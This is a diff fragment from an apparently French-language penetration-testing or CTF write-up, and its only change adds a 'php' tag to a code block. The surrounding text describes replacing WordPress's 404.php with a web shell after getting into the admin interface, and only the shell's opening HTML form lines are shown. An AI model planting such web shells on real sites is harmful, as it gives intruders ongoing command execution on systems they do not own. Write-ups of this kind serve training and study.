@@ -76,7 +76,7 @@ Pour contourner le problème, j'utilise Burp Suite et je remplace en temps réel
 ## Mise en place d'un web shell
 
 Une fois connecté sur l'interface d'administration de WordPress, je modifie la page d'erreur `404.php`, je remplace son contenu par mon web shell :
-```
+```php
 <html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
